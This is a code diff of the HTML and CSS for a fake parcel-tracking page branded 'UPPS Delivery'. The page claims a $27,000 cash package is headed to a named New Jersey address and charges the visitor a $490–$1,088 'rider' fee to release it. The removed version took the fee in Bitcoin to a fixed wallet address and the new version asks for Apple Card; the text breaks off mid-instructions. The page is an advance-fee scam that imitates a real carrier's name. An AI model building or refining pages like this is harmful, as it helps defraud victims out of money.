@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Delivery Service</title>
+    <title>UPPS Delivery - Track with Precision</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
@@ -14,60 +14,156 @@
 
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #000000 0%, #1a1a1a 100%);
-            color: #e0e0e0;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
+            color: #fff;
             min-height: 100vh;
+            overflow-x: hidden;
         }
 
-        :root {
-            --primary-green: #00d084;
-            --dark-green: #00a86b;
-            --accent-green: #39ff14;
-            --dark-bg: #0a0a0a;
-            --card-bg: #1a1a1a;
-            --border-color: #00d084;
-        }
-
+        /* Header */
         header {
-            background: linear-gradient(135deg, var(--dark-green) 0%, var(--primary-green) 100%);
-            padding: 30px 20px;
-            box-shadow: 0 8px 32px rgba(0, 208, 132, 0.3);
-            position: sticky;
-            top: 0;
-            z-index: 100;
+            background: linear-gradient(135deg, #1a1a1a 0%, #0d0d0d 100%);
+            border-bottom: 2px solid #00d084;
+            padding: 20px;
+            box-shadow: 0 4px 15px rgba(0, 208, 132, 0.2);
         }
 
-        header h1 {
-            text-align: center;
-            color: white;
-            font-size: 2.5em;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 32px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #00d084 0%, #39ff14 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
             display: flex;
             align-items: center;
-            justify-content: center;
             gap: 10px;
         }
 
+        .logo i {
+            font-size: 36px;
+        }
+
+        .admin-badge {
+            background: #00d084;
+            color: #000;
+            padding: 8px 16px;
+            border-radius: 25px;
+            font-weight: 600;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        /* Main Container */
         .container {
             max-width: 1200px;
             margin: 0 auto;
-            padding: 20px;
+            padding: 40px 20px;
         }
 
-        .section {
-            background: var(--card-bg);
-            border: 2px solid var(--border-color);
-            border-radius: 12px;
-            padding: 30px;
-            margin: 20px 0;
-            box-shadow: 0 8px 32px rgba(0, 208, 132, 0.2);
-            animation: slideIn 0.6s ease-out;
+        /* Tracking Section */
+        .tracking-section {
+            background: linear-gradient(135deg, rgba(0, 208, 132, 0.1) 0%, rgba(57, 255, 20, 0.05) 100%);
+            border: 2px solid #00d084;
+            border-radius: 15px;
+            padding: 40px;
+            margin-bottom: 40px;
+            text-align: center;
+            box-shadow: 0 8px 32px rgba(0, 208, 132, 0.15);
         }
 
-        @keyframes slideIn {
+        .tracking-section h1 {
+            font-size: 48px;
+            margin-bottom: 10px;
+            background: linear-gradient(135deg, #00d084 0%, #39ff14 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .tracking-section p {
+            font-size: 18px;
+            color: #aaa;
+            margin-bottom: 30px;
+        }
+
+        .tracking-input-group {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .tracking-input {
+            padding: 15px 20px;
+            border: 2px solid #00d084;
+            border-radius: 10px;
+            background: rgba(0, 208, 132, 0.05);
+            color: #fff;
+            font-size: 16px;
+            width: 300px;
+            transition: all 0.3s ease;
+        }
+
+        .tracking-input:focus {
+            outline: none;
+            background: rgba(0, 208, 132, 0.15);
+            box-shadow: 0 0 20px rgba(0, 208, 132, 0.5);
+            border-color: #39ff14;
+        }
+
+        .btn {
+            padding: 15px 40px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #00d084 0%, #39ff14 100%);
+            color: #000;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(0, 208, 132, 0.4);
+        }
+
+        .btn-primary:active {
+            transform: translateY(-1px);
+        }
+
+        /* Hidden Content */
+        .hidden-content {
+            display: none;
+        }
+
+        .hidden-content.active {
+            display: block;
+            animation: slideDown 0.5s ease;
+        }
+
+        @keyframes slideDown {
             from {
                 opacity: 0;
-                transform: translateY(20px);
+                transform: translateY(-20px);
             }
             to {
                 opacity: 1;
@@ -75,59 +171,113 @@
             }
         }
 
-        h2 {
-            color: var(--primary-green);
-            margin-bottom: 20px;
-            font-size: 1.8em;
-            border-bottom: 2px solid var(--accent-green);
-            padding-bottom: 10px;
+        /* Item Details Section */
+        .item-details {
+            background: linear-gradient(135deg, rgba(0, 208, 132, 0.08) 0%, rgba(57, 255, 20, 0.03) 100%);
+            border: 2px solid #00d084;
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 40px;
+            box-shadow: 0 8px 32px rgba(0, 208, 132, 0.1);
         }
 
-        .track-info {
+        .item-details h2 {
+            color: #00d084;
+            margin-bottom: 20px;
+            font-size: 28px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .item-grid {
             display: grid;
-            grid-template-columns: 1fr 1fr;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
             gap: 20px;
+            margin-top: 20px;
+        }
+
+        .item-card {
+            background: rgba(0, 208, 132, 0.05);
+            border: 1px solid #00d084;
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .item-card:hover {
+            background: rgba(0, 208, 132, 0.15);
+            transform: translateY(-5px);
+            box-shadow: 0 8px 20px rgba(0, 208, 132, 0.2);
+        }
+
+        .item-card .label {
+            color: #aaa;
+            font-size: 12px;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+            letter-spacing: 1px;
+        }
+
+        .item-card .value {
+            color: #00d084;
+            font-size: 24px;
+            font-weight: 700;
+        }
+
+        /* Map Section */
+        .map-section {
+            margin-bottom: 40px;
+        }
+
+        .map-section h2 {
+            color: #00d084;
             margin-bottom: 20px;
+            font-size: 28px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
 
-        .info-box {
-            background: linear-gradient(135deg, rgba(0, 208, 132, 0.1) 0%, rgba(57, 255, 20, 0.05) 100%);
-            border-left: 4px solid var(--primary-green);
-            padding: 15px;
-            border-radius: 8px;
-        }
-
-        .info-box label {
-            color: var(--accent-green);
-            font-weight: bold;
-            display: block;
-            margin-bottom: 5px;
-        }
-
-        .info-box p {
-            color: white;
-            font-size: 1.1em;
-        }
-
-        #map {
-            width: 100%;
+        .map-container {
+            border: 2px solid #00d084;
+            border-radius: 15px;
+            overflow: hidden;
             height: 500px;
-            border-radius: 8px;
-            border: 2px solid var(--border-color);
-            margin: 20px 0;
+            box-shadow: 0 8px 32px rgba(0, 208, 132, 0.2);
+        }
+
+        .map-container iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+
+        /* Delivery Riders Section */
+        .riders-section {
+            margin-bottom: 40px;
+        }
+
+        .riders-section h2 {
+            color: #00d084;
+            margin-bottom: 20px;
+            font-size: 28px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
 
         .riders-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 15px;
-            margin: 20px 0;
+            gap: 20px;
         }
 
         .rider-card {
-            background: linear-gradient(135deg, rgba(0, 208, 132, 0.05) 0%, rgba(0, 0, 0, 0.3) 100%);
-            border: 2px solid var(--border-color);
-            border-radius: 8px;
+            background: linear-gradient(135deg, rgba(0, 208, 132, 0.08) 0%, rgba(57, 255, 20, 0.03) 100%);
+            border: 2px solid #00d084;
+            border-radius: 15px;
             padding: 20px;
             cursor: pointer;
             transition: all 0.3s ease;
@@ -135,155 +285,117 @@
             overflow: hidden;
         }
 
+        .rider-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 208, 132, 0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        .rider-card:hover::before {
+            left: 100%;
+        }
+
         .rider-card:hover {
-            background: linear-gradient(135deg, rgba(0, 208, 132, 0.15) 0%, rgba(0, 0, 0, 0.2) 100%);
-            box-shadow: 0 8px 24px rgba(0, 208, 132, 0.4);
-            transform: translateY(-5px);
+            transform: translateY(-10px);
+            box-shadow: 0 12px 40px rgba(0, 208, 132, 0.3);
+            background: linear-gradient(135deg, rgba(0, 208, 132, 0.15) 0%, rgba(57, 255, 20, 0.08) 100%);
+            border-color: #39ff14;
         }
 
         .rider-card.selected {
-            background: linear-gradient(135deg, rgba(0, 208, 132, 0.3) 0%, rgba(57, 255, 20, 0.1) 100%);
-            border-color: var(--accent-green);
-            box-shadow: 0 0 20px rgba(0, 208, 132, 0.5);
-        }
-
-        .rider-card input[type="radio"] {
-            display: none;
+            background: linear-gradient(135deg, rgba(0, 208, 132, 0.25) 0%, rgba(57, 255, 20, 0.15) 100%);
+            border-color: #39ff14;
+            box-shadow: 0 0 30px rgba(0, 208, 132, 0.5);
         }
 
         .rider-header {
             display: flex;
             align-items: center;
-            margin-bottom: 10px;
+            gap: 15px;
+            margin-bottom: 15px;
         }
 
         .rider-avatar {
-            width: 50px;
-            height: 50px;
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #00d084 0%, #39ff14 100%);
             border-radius: 50%;
-            background: var(--primary-green);
             display: flex;
             align-items: center;
             justify-content: center;
-            color: black;
-            font-size: 1.5em;
-            margin-right: 10px;
+            color: #000;
+            font-size: 28px;
+            font-weight: 700;
         }
 
         .rider-info h3 {
-            color: var(--primary-green);
-            margin: 0;
+            color: #00d084;
+            margin-bottom: 5px;
+            font-size: 18px;
         }
 
-        .rider-info p {
-            color: #888;
-            font-size: 0.9em;
-            margin: 0;
+        .rider-rating {
+            color: #aaa;
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .rider-rating .stars {
+            color: #ffc107;
         }
 
         .rider-details {
-            display: flex;
-            justify-content: space-between;
-            margin: 15px 0;
-            padding: 10px 0;
-            border-top: 1px solid var(--border-color);
-            border-bottom: 1px solid var(--border-color);
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid rgba(0, 208, 132, 0.3);
         }
 
         .detail-item {
             text-align: center;
         }
 
-        .detail-item i {
-            color: var(--accent-green);
-            font-size: 1.3em;
+        .detail-item .label {
+            color: #aaa;
+            font-size: 12px;
+            text-transform: uppercase;
             margin-bottom: 5px;
-        }
-
-        .detail-item p {
-            color: white;
-            font-weight: bold;
-            margin: 0;
-        }
-
-        .detail-item span {
-            color: #888;
-            font-size: 0.8em;
             display: block;
+        }
+
+        .detail-item .value {
+            color: #00d084;
+            font-size: 16px;
+            font-weight: 600;
         }
 
         .rider-price {
-            color: var(--accent-green);
-            font-size: 1.5em;
-            font-weight: bold;
-            text-align: right;
+            text-align: center;
+            padding-top: 15px;
         }
 
-        .confirmation-section {
-            display: none;
+        .price {
+            color: #39ff14;
+            font-size: 32px;
+            font-weight: 900;
         }
 
-        .confirmation-section.active {
-            display: block;
+        .price-label {
+            color: #aaa;
+            font-size: 12px;
         }
 
-        .confirmation-details {
-            background: linear-gradient(135deg, rgba(0, 208, 132, 0.1) 0%, rgba(57, 255, 20, 0.05) 100%);
-            padding: 20px;
-            border-radius: 8px;
-            border: 2px dashed var(--primary-green);
-            margin: 20px 0;
-        }
-
-        .confirmation-details p {
-            margin: 10px 0;
-            color: white;
-        }
-
-        .confirmation-details strong {
-            color: var(--accent-green);
-        }
-
-        .button {
-            background: linear-gradient(135deg, var(--primary-green) 0%, var(--dark-green) 100%);
-            color: black;
-            border: none;
-            padding: 12px 30px;
-            font-size: 1em;
-            border-radius: 6px;
-            cursor: pointer;
-            font-weight: bold;
-            transition: all 0.3s ease;
-            margin: 10px 5px 10px 0;
-        }
-
-        .button:hover {
-            background: linear-gradient(135deg, var(--accent-green) 0%, var(--primary-green) 100%);
-            box-shadow: 0 8px 20px rgba(0, 208, 132, 0.4);
-            transform: translateY(-2px);
-        }
-
-        .button:active {
-            transform: translateY(0);
-        }
-
-        .button.secondary {
-            background: linear-gradient(135deg, #444 0%, #333 100%);
-            color: white;
-        }
-
-        .button.secondary:hover {
-            background: linear-gradient(135deg, #555 0%, #444 100%);
-        }
-
-        .button-group {
-            display: flex;
-            gap: 10px;
-            margin-top: 20px;
-            flex-wrap: wrap;
-        }
-
-        .loading-overlay {
+        /* Order Confirmation Modal */
+        .modal {
             display: none;
             position: fixed;
             top: 0;
@@ -292,22 +404,126 @@
             height: 100%;
             background: rgba(0, 0, 0, 0.9);
             z-index: 1000;
-            flex-direction: column;
             align-items: center;
             justify-content: center;
         }
 
-        .loading-overlay.active {
+        .modal.active {
             display: flex;
+            animation: fadeIn 0.3s ease;
         }
 
-        .spinner {
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        .modal-content {
+            background: linear-gradient(135deg, #1a1a1a 0%, #0d0d0d 100%);
+            border: 2px solid #00d084;
+            border-radius: 15px;
+            padding: 40px;
+            max-width: 500px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(0, 208, 132, 0.3);
+        }
+
+        .modal-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .modal-header h2 {
+            color: #00d084;
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+
+        .modal-header p {
+            color: #aaa;
+            font-size: 14px;
+        }
+
+        .order-summary {
+            background: rgba(0, 208, 132, 0.05);
+            border: 1px solid #00d084;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .summary-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid rgba(0, 208, 132, 0.2);
+        }
+
+        .summary-item:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+            padding-bottom: 0;
+        }
+
+        .summary-item .label {
+            color: #aaa;
+        }
+
+        .summary-item .value {
+            color: #00d084;
+            font-weight: 600;
+        }
+
+        .modal-buttons {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-top: 30px;
+        }
+
+        .btn-cancel {
+            background: rgba(0, 208, 132, 0.1);
+            color: #00d084;
+            border: 1px solid #00d084;
+        }
+
+        .btn-cancel:hover {
+            background: rgba(0, 208, 132, 0.2);
+        }
+
+        /* Loading Animation */
+        .loading-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 1100;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+
+        .loading-modal.active {
+            display: flex;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .loader {
             width: 80px;
             height: 80px;
-            border: 4px solid var(--dark-green);
-            border-top: 4px solid var(--primary-green);
+            border: 4px solid rgba(0, 208, 132, 0.2);
+            border-top: 4px solid #00d084;
+            border-right: 4px solid #39ff14;
             border-radius: 50%;
-            animation: spin 4s linear infinite;
+            animation: spin 1s linear infinite;
             margin-bottom: 20px;
         }
 
@@ -317,564 +533,603 @@
         }
 
         .loading-text {
-            color: var(--primary-green);
-            font-size: 1.3em;
-            font-weight: bold;
+            color: #00d084;
+            font-size: 20px;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .loading-note {
+            color: #aaa;
+            font-size: 14px;
             text-align: center;
         }
 
-        .loading-text p {
-            margin: 5px 0;
-        }
-
+        /* Payment Section */
         .payment-section {
-            display: none;
+            background: linear-gradient(135deg, rgba(0, 208, 132, 0.08) 0%, rgba(57, 255, 20, 0.03) 100%);
+            border: 2px solid #00d084;
+            border-radius: 15px;
+            padding: 40px;
+            text-align: center;
         }
 
-        .payment-section.active {
-            display: block;
+        .payment-section h2 {
+            color: #00d084;
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+
+        .payment-section p {
+            color: #aaa;
+            margin-bottom: 30px;
         }
 
         .payment-method {
-            background: linear-gradient(135deg, rgba(0, 208, 132, 0.1) 0%, rgba(0, 0, 0, 0.3) 100%);
-            border: 2px solid var(--border-color);
-            border-radius: 8px;
+            background: rgba(0, 208, 132, 0.05);
+            border: 1px solid #00d084;
+            border-radius: 10px;
             padding: 20px;
-            margin: 15px 0;
-            text-align: center;
-        }
-
-        .btc-address {
-            background: var(--dark-bg);
-            padding: 15px;
-            border-radius: 6px;
-            margin: 15px 0;
-            border: 1px solid var(--border-color);
-            word-break: break-all;
-            color: var(--primary-green);
-            font-family: 'Courier New', monospace;
-            font-weight: bold;
-        }
-
-        .qr-code {
-            display: inline-block;
-            padding: 20px;
-            background: white;
-            border-radius: 8px;
-            margin: 20px 0;
-        }
-
-        .security-note {
-            background: linear-gradient(135deg, rgba(0, 208, 132, 0.15) 0%, rgba(57, 255, 20, 0.05) 100%);
-            border-left: 4px solid var(--accent-green);
-            padding: 15px;
-            border-radius: 6px;
-            margin: 20px 0;
-        }
-
-        .security-note i {
-            color: var(--accent-green);
-            margin-right: 10px;
-        }
-
-        .modal {
-            display: none;
-            position: fixed;
-            z-index: 500;
-            left: 0;
-            top: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.8);
-            animation: fadeIn 0.3s ease;
-        }
-
-        .modal.active {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
-        .modal-content {
-            background: var(--card-bg);
-            border: 2px solid var(--border-color);
-            border-radius: 12px;
-            padding: 30px;
-            max-width: 600px;
-            width: 90%;
-            box-shadow: 0 8px 32px rgba(0, 208, 132, 0.3);
-            animation: slideUp 0.3s ease;
-        }
-
-        @keyframes slideUp {
-            from {
-                transform: translateY(50px);
-                opacity: 0;
-            }
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
-        }
-
-        .modal-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
             margin-bottom: 20px;
-            border-bottom: 2px solid var(--border-color);
-            padding-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            transition: all 0.3s ease;
         }
 
-        .modal-header h2 {
-            margin: 0;
-            border: none;
-            padding: 0;
+        .payment-method:hover {
+            background: rgba(0, 208, 132, 0.15);
+            box-shadow: 0 8px 20px rgba(0, 208, 132, 0.2);
         }
 
-        .close-btn {
-            background: none;
-            border: none;
-            color: var(--primary-green);
-            font-size: 1.5em;
-            cursor: pointer;
+        .payment-method i {
+            font-size: 32px;
+            color: #00d084;
         }
 
-        .close-btn:hover {
-            color: var(--accent-green);
+        .payment-method-info {
+            text-align: left;
+            flex: 1;
         }
 
-        .status-badge {
-            display: inline-block;
-            background: var(--primary-green);
-            color: black;
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-weight: bold;
-            font-size: 0.9em;
-            margin: 5px 0;
+        .payment-method-info h3 {
+            color: #00d084;
+            margin-bottom: 5px;
         }
 
+        .payment-method-info p {
+            color: #aaa;
+            font-size: 13px;
+        }
+
+        .payment-instructions {
+            background: rgba(0, 208, 132, 0.05);
+            border: 1px dashed #00d084;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 30px;
+            text-align: left;
+        }
+
+        .payment-instructions h3 {
+            color: #00d084;
+            margin-bottom: 15px;
+        }
+
+        .payment-instructions ol {
+            margin-left: 20px;
+            color: #aaa;
+        }
+
+        .payment-instructions li {
+            margin-bottom: 10px;
+            line-height: 1.6;
+        }
+
+        .payment-instructions strong {
+            color: #00d084;
+        }
+
+        .btn-pay-now {
+            background: linear-gradient(135deg, #00d084 0%, #39ff14 100%);
+            color: #000;
+            font-size: 18px;
+            padding: 18px 50px;
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .btn-pay-now:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 40px rgba(0, 208, 132, 0.4);
+        }
+
+        /* Footer */
         footer {
-            background: var(--dark-bg);
-            border-top: 2px solid var(--border-color);
+            background: #0a0a0a;
+            border-top: 2px solid #00d084;
             padding: 30px 20px;
             text-align: center;
-            color: #888;
-            margin-top: 40px;
+            color: #aaa;
+            margin-top: 60px;
         }
 
-        footer p {
-            margin: 5px 0;
-        }
-
+        /* Responsive */
         @media (max-width: 768px) {
-            header h1 {
-                font-size: 1.8em;
+            .tracking-section {
+                padding: 20px;
             }
 
-            .track-info {
-                grid-template-columns: 1fr;
+            .tracking-input {
+                width: 100%;
+            }
+
+            .header-content {
+                flex-direction: column;
+                gap: 15px;
+            }
+
+            .logo {
+                font-size: 24px;
+            }
+
+            .tracking-section h1 {
+                font-size: 32px;
+            }
+
+            .modal-content {
+                padding: 25px;
+            }
+
+            .map-container {
+                height: 300px;
             }
 
             .riders-grid {
                 grid-template-columns: 1fr;
             }
 
-            .button-group {
-                flex-direction: column;
+            .modal-buttons {
+                grid-template-columns: 1fr;
             }
-
-            .button {
-                width: 100%;
-            }
-
-            #map {
-                height: 300px;
-            }
-
-            .modal-content {
-                width: 95%;
-            }
-        }
-
-        .success-icon {
-            color: var(--primary-green);
-            font-size: 3em;
-            margin-bottom: 15px;
-        }
-
-        .warning-text {
-            color: #ff6b6b;
-            font-weight: bold;
-            margin: 10px 0;
         }
     </style>
 </head>
 <body>
+    <!-- Header -->
     <header>
-        <h1><i class="fas fa-truck"></i> ProDeliver - Premium Delivery Service</h1>
+        <div class="header-content">
+            <div class="logo">
+                <i class="fas fa-truck-fast"></i>
+                UPPS Delivery
+            </div>
+            <div class="admin-badge">
+                <i class="fas fa-shield-alt"></i>
+                Admin
+            </div>
+        </div>
     </header>
 
+    <!-- Main Container -->
     <div class="container">
         <!-- Tracking Section -->
-        <section class="section">
-            <h2><i class="fas fa-map-pin"></i> Track Your Delivery</h2>
-            <div class="track-info">
-                <div class="info-box">
-                    <label><i class="fas fa-barcode"></i> Track ID</label>
-                    <p>REG81993</p>
-                </div>
-                <div class="info-box">
-                    <label><i class="fas fa-box"></i> Item Value</label>
-                    <p>$27,000 (Cash)</p>
-                </div>
-                <div class="info-box">
-                    <label><i class="fas fa-map-marker-alt"></i> Destination</label>
-                    <p>27 Kings Lane, Cape May Courthouse, NJ 08210</p>
-                </div>
-                <div class="info-box">
-                    <label><i class="fas fa-clock"></i> Estimated Delivery</label>
-                    <p>2-4 Hours</p>
-                </div>
-            </div>
-        </section>
-
-        <!-- Map Section -->
-        <section class="section">
-            <h2><i class="fas fa-route"></i> Delivery Route Map</h2>
-            <p style="margin-bottom: 15px;">Route from US Airports to your delivery location:</p>
-            <div id="map"></div>
-            <div style="background: linear-gradient(135deg, rgba(0, 208, 132, 0.1) 0%, rgba(0, 0, 0, 0.3) 100%); padding: 15px; border-radius: 8px; margin-top: 15px; border-left: 4px solid var(--primary-green);">
-                <p><strong><i class="fas fa-plane"></i> Origin:</strong> United States - Major Airports</p>
-                <p><strong><i class="fas fa-map-marker-alt"></i> Destination:</strong> 27 Kings Lane, Cape May Courthouse, NJ 08210</p>
-                <p><strong><i class="fas fa-shipping-fast"></i> Status:</strong> <span class="status-badge">IN TRANSIT</span></p>
-            </div>
-        </section>
-
-        <!-- Rider Selection Section -->
-        <section class="section">
-            <h2><i class="fas fa-users"></i> Select Your Delivery Rider</h2>
-            <p style="margin-bottom: 20px; color: #aaa;">Choose from 10 professional delivery riders. Prices range from $490 - $1,088</p>
+        <div class="tracking-section">
+            <h1>Track with Precision</h1>
+            <p>Deliver with Confidence</p>
+            <p style="font-size: 14px; color: #888;">Enter your tracking ID to view delivery details and select a rider</p>
             
-            <div class="riders-grid" id="ridersGrid">
-                <!-- Rider cards will be generated by JavaScript -->
-            </div>
-        </section>
-
-        <!-- Confirmation Preview Section -->
-        <section class="section confirmation-section" id="confirmationSection">
-            <h2><i class="fas fa-check-circle"></i> Order Preview & Confirmation</h2>
-            <div class="confirmation-details">
-                <p><strong>Track ID:</strong> <span id="confirmTrackId">REG81993</span></p>
-                <p><strong>Delivery Address:</strong> <span id="confirmAddress">27 Kings Lane, Cape May Courthouse, NJ 08210</span></p>
-                <p><strong>Item Value:</strong> <span id="confirmValue">$27,000 (Cash)</span></p>
-                <p><strong>Selected Rider:</strong> <span id="confirmRider">-</span></p>
-                <p><strong>Delivery Charge:</strong> <span id="confirmCharge">$0.00</span></p>
-                <p><strong>Total Cost:</strong> <span id="confirmTotal">$0.00</span></p>
-                <p><strong>Estimated Delivery Time:</strong> <span id="confirmTime">2-4 Hours</span></p>
-            </div>
-            
-            <div class="warning-text" style="background: linear-gradient(135deg, rgba(255, 107, 107, 0.15) 0%, rgba(0, 0, 0, 0.2) 100%); padding: 15px; border-left: 4px solid #ff6b6b; border-radius: 6px;">
-                <i class="fas fa-exclamation-triangle"></i> <strong>IMPORTANT:</strong> Additional charges will apply. Please review the total amount before confirming payment.
-            </div>
-
-            <div class="button-group">
-                <button class="button" onclick="proceedToPayment()"><i class="fas fa-arrow-right"></i> Proceed to Payment</button>
-                <button class="button secondary" onclick="cancelConfirmation()"><i class="fas fa-times"></i> Cancel</button>
-            </div>
-        </section>
-
-        <!-- Payment Section -->
-        <section class="section payment-section" id="paymentSection">
-            <h2><i class="fas fa-credit-card"></i> Secure Payment</h2>
-            <p style="margin-bottom: 20px;">Complete your payment in Bitcoin (BTC)</p>
-
-            <div class="payment-method">
-                <h3 style="color: var(--primary-green); margin-bottom: 15px;">Bitcoin Payment Details</h3>
-                <p style="color: #aaa; margin-bottom: 15px;">Send the exact amount to the address below:</p>
-                <div class="btc-address" id="btcAddress">bc1q7a3z4fma46nvz08r7xcp5u83ksuwz9a0mfce0h</div>
-                <button class="button" onclick="copyBTCAddress()" style="margin-top: 10px;">
-                    <i class="fas fa-copy"></i> Copy Address
+            <div class="tracking-input-group">
+                <input type="text" id="trackingInput" class="tracking-input" placeholder="Enter Tracking ID (REG81993)">
+                <button class="btn btn-primary" onclick="verifyTracking()">
+                    <i class="fas fa-search"></i> Verify
                 </button>
+            </div>
+            <p style="font-size: 12px; color: #666;">Example: REG81993</p>
+        </div>
 
-                <p style="margin-top: 20px; margin-bottom: 15px;"><strong>QR Code:</strong></p>
-                <div style="display: flex; justify-content: center;">
-                    <div class="qr-code">
-                        <img src="https://api.qrserver.com/v1/create-qr-code/?data=bc1q7a3z4fma46nvz08r7xcp5u83ksuwz9a0mfce0h&size=250x250" alt="Bitcoin QR Code" style="width: 250px; height: 250px;">
+        <!-- Hidden Content (appears after tracking verification) -->
+        <div id="hiddenContent" class="hidden-content">
+            <!-- Item Details -->
+            <div class="item-details">
+                <h2><i class="fas fa-box"></i> Package Details</h2>
+                <div class="item-grid">
+                    <div class="item-card">
+                        <span class="label">Item Type</span>
+                        <span class="value">Cash</span>
+                    </div>
+                    <div class="item-card">
+                        <span class="label">Item Value</span>
+                        <span class="value">$27,000</span>
+                    </div>
+                    <div class="item-card">
+                        <span class="label">Tracking ID</span>
+                        <span class="value">REG81993</span>
+                    </div>
+                    <div class="item-card">
+                        <span class="label">Status</span>
+                        <span class="value" style="color: #39ff14;">Incoming</span>
                     </div>
                 </div>
             </div>
 
-            <div class="security-note">
-                <p><i class="fas fa-lock"></i> <strong>Security:</strong> Your transaction is secured with blockchain technology. Please verify the address before sending.</p>
+            <!-- Map Section -->
+            <div class="map-section">
+                <h2><i class="fas fa-map-location-dot"></i> Delivery Location</h2>
+                <div class="map-container">
+                    <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3078.267484282035!2d-74.9535!3d39.0744!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x89c45c8d8d8d8d8d%3A0x8d8d8d8d8d8d8d8d!2s27%20Kings%20Lane%2C%20Cape%20May%20Courthouse%2C%20NJ%2008210!5e0!3m2!1sen!2sus!4v1640601145505" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
+                </div>
             </div>
 
-            <div class="security-note" style="border-left-color: #ff6b6b; background: linear-gradient(135deg, rgba(255, 107, 107, 0.1) 0%, rgba(0, 0, 0, 0.2) 100%);">
-                <p><i class="fas fa-info-circle"></i> <strong>Note:</strong> This is a premium service. Network fees and Bitcoin transaction costs may apply.</p>
+            <!-- Delivery Riders Section -->
+            <div class="riders-section">
+                <h2><i class="fas fa-users"></i> Available Delivery Riders</h2>
+                <p style="color: #aaa; margin-bottom: 20px;">Select your preferred delivery option</p>
+                <div class="riders-grid" id="ridersContainer"></div>
             </div>
 
-            <div class="button-group">
-                <button class="button" onclick="completePayment()"><i class="fas fa-check"></i> Payment Sent</button>
-                <button class="button secondary" onclick="backToConfirmation()"><i class="fas fa-arrow-left"></i> Back</button>
+            <!-- Payment Section -->
+            <div class="payment-section" id="paymentSection" style="display: none;">
+                <h2><i class="fas fa-credit-card"></i> Payment</h2>
+                <p>Complete your payment using Apple Card</p>
+                
+                <div class="payment-method">
+                    <i class="fas fa-apple"></i>
+                    <div class="payment-method-info">
+                        <h3>Apple Card</h3>
+                        <p>Secure & Fast Payment</p>
+                    </div>
+                </div>
+
+                <div class="payment-instructions">
+                    <h3><i class="fas fa-info-circle"></i> Payment Instructions:</h3>
+                    <ol>
